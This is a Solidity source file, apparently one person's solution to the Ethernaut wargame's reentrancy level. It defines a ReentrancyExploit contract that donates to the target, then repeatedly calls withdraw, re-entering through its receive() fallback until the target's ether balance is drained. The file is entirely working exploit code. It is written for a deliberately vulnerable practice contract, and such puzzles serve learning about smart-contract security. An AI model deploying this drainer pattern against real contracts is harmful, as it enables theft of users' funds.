// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.6.12;

import {Reentrance} from "src/10/Reentrancy.sol";

contract ReentrancyExploit {

    Reentrance level;
    uint256 deposit;

    function run(Reentrance _level) external payable returns (bool) {
        level = _level;
        deposit = msg.value;
        level.donate{value: deposit}(address(this));
        drainContract();
        return true;
    }

    receive() external payable {
        drainContract();
    }

    function drainContract() private {
        uint256 targetBalance = address(level).balance;
        bool continueAttack = targetBalance > 0;

        if (continueAttack) {
            uint256 withdrawAmount = targetBalance > deposit ? deposit : targetBalance;
            level.withdraw(withdrawAmount);
        }
    }
}
